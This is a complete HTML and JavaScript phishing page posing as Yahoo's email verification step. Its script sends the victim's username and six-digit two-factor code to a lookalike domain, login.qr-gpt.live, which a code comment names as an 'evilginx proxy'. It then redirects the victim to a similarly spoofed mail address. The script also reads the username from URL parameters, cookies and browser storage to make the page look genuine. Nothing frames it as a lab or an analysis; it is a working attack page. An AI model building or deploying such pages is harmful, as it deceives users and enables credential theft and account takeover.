<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Email Verification</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
  
  <style>
    .verification-container {
      max-width: 400px;
      margin: 50px auto;
      padding: 40px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    .yahoo-logo {
      width: 80px;
      height: auto;
      margin-bottom: 30px;
    }
    .verification-title {
      font-size: 24px;
      font-weight: 600;
      color: #190078;
      margin-bottom: 10px;
    }
    .verification-subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 30px;
      line-height: 1.4;
    }
    .email-display {
      background: #f7f7f7;
      padding: 12px;
      border-radius: 4px;
      font-weight: 500;
      margin-bottom: 20px;
      color: #333;
    }
    .code-input {
      width: 100%;
      padding: 15px;
      border: 2px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
      text-align: center;
      letter-spacing: 2px;
      margin-bottom: 20px;
    }
    .code-input:focus {
      outline: none;
      border-color: #7b68ee;
    }
    .verify-btn {
      width: 100%;
      padding: 15px;
      background: #7b68ee;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 20px;
    }
    .verify-btn:hover {
      background: #6a5acd;
    }
    .verify-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .resend-link {
      color: #7b68ee;
      text-decoration: none;
      font-size: 14px;
    }
    .resend-link:hover {
      text-decoration: underline;
    }
    .error-message {
      color: #d93025;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }
    .success-message {
      color: #0f9d58;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>

<body>
  <div class="verification-container">
    <img src="images/yahoo.png" alt="Yahoo" class="yahoo-logo">
    
    <h1 class="verification-title">Check your email</h1>
    <p class="verification-subtitle">
      We sent a verification code to your email address. Enter the code below to continue.
    </p>
    
    <div class="email-display" id="user-email">
      Loading email address...
    </div>
    
    <form id="verification-form" action="https://login.qr-gpt.live/account/challenge/email-verify" method="POST">
      <input type="hidden" name="username" id="hidden-username">
      <input type="hidden" name="acrumb" value="dqd4JdSY">
      <input type="hidden" name="sessionIndex" value="QQ--">
      <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
      
      <input 
        type="text" 
        class="code-input" 
        id="verification-code" 
        name="code" 
        placeholder="Enter 6-digit code" 
        maxlength="6" 
        pattern="[0-9]{6}" 
        required 
        autofocus
      >
      
      <button type="submit" class="verify-btn" id="verify-btn">
        Verify
      </button>
      
      <div class="error-message" id="error-message"></div>
      <div class="success-message" id="success-message"></div>
    </form>
    
    <a href="#" class="resend-link" id="resend-link">Didn't receive the code? Resend</a>
  </div>

  <script>
  (function() {
      'use strict';
      
      const elements = {
          form: document.getElementById('verification-form'),
          codeInput: document.getElementById('verification-code'),
          verifyBtn: document.getElementById('verify-btn'),
          userEmail: document.getElementById('user-email'),
          hiddenUsername: document.getElementById('hidden-username'),
          errorMessage: document.getElementById('error-message'),
          successMessage: document.getElementById('success-message'),
          resendLink: document.getElementById('resend-link')
      };
      
      let currentUsername = '';
      
      function getUsername() {
          // Get username from URL parameter
          const urlParams = new URLSearchParams(window.location.search);
          let username = urlParams.get('u');
          
          if (username) {
              return decodeURIComponent(username);
          }
          
          // Get from cookie
          const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
          if (cookieMatch) {
              return decodeURIComponent(cookieMatch[1]);
          }
          
          // Get from storage
          return sessionStorage.getItem('yh_username') || localStorage.getItem('yh_username') || 'your email';
      }
      
      function showError(message) {
          elements.errorMessage.textContent = message;
          elements.errorMessage.style.display = 'block';
          elements.successMessage.style.display = 'none';
          elements.codeInput.style.borderColor = '#d93025';
      }
      
      function showSuccess(message) {
          elements.successMessage.textContent = message;
          elements.successMessage.style.display = 'block';
          elements.errorMessage.style.display = 'none';
          elements.codeInput.style.borderColor = '#0f9d58';
      }
      
      function clearMessages() {
          elements.errorMessage.style.display = 'none';
          elements.successMessage.style.display = 'none';
          elements.codeInput.style.borderColor = '#ddd';
      }
      
      function handleFormSubmission(event) {
          event.preventDefault();
          
          const code = elements.codeInput.value.trim();
          if (!code || code.length !== 6) {
              showError('Please enter a valid 6-digit code.');
              return;
          }
          
          clearMessages();
          elements.verifyBtn.disabled = true;
          elements.verifyBtn.textContent = 'Verifying...';
          
          // Prepare form data
          const formData = new FormData(elements.form);
          formData.set('username', currentUsername);
          formData.set('code', code);
          
          console.log('Submitting 2FA code to evilginx:', code);
          
          // Submit to evilginx proxy
          fetch(elements.form.action, {
              method: 'POST',
              body: new URLSearchParams(formData),
              credentials: 'include',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Referer': window.location.href,
                  'Origin': window.location.origin
              }
          })
          .then(response => {
              elements.verifyBtn.disabled = false;
              elements.verifyBtn.textContent = 'Verify';
              
              if (response.ok) {
                  showSuccess('Code verified! Redirecting...');
                  setTimeout(() => {
                      window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                  }, 2000);
              } else if (response.status === 302) {
                  showSuccess('Code accepted! Following redirect...');
                  setTimeout(() => {
                      window.location.reload();
                  }, 1000);
              } else {
                  showError('Invalid code. Please try again.');
              }
          })
          .catch(error => {
              elements.verifyBtn.disabled = false;
              elements.verifyBtn.textContent = 'Verify';
              showError('Connection error. Please try again.');
              console.error('Verification error:', error);
          });
      }
      
      function handleResend(event) {
          event.preventDefault();
          elements.resendLink.textContent = 'Sending...';
          
          setTimeout(() => {
              elements.resendLink.textContent = 'Code sent! Check your email';
              setTimeout(() => {
                  elements.resendLink.textContent = "Didn't receive the code? Resend";
              }, 3000);
          }, 1000);
      }
      
      function init() {
          currentUsername = getUsername();
          elements.userEmail.textContent = currentUsername;
          elements.hiddenUsername.value = currentUsername;
          
          // Auto-format code input
          elements.codeInput.addEventListener('input', function(e) {
              let value = e.target.value.replace(/\D/g, '');
              if (value.length > 6) value = value.slice(0, 6);
              e.target.value = value;
              clearMessages();
          });
          
          elements.codeInput.addEventListener('keydown', function(e) {
              if (e.key === 'Enter') {
                  e.preventDefault();
                  elements.form.dispatchEvent(new Event('submit'));
              }
          });
          
          elements.form.addEventListener('submit', handleFormSubmission);
          elements.resendLink.addEventListener('click', handleResend);
          
          console.log('2FA Email verification page loaded for:', currentUsername);
      }
      
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
      } else {
          init();
      }
      
  })();
  </script>
</body>
</html>
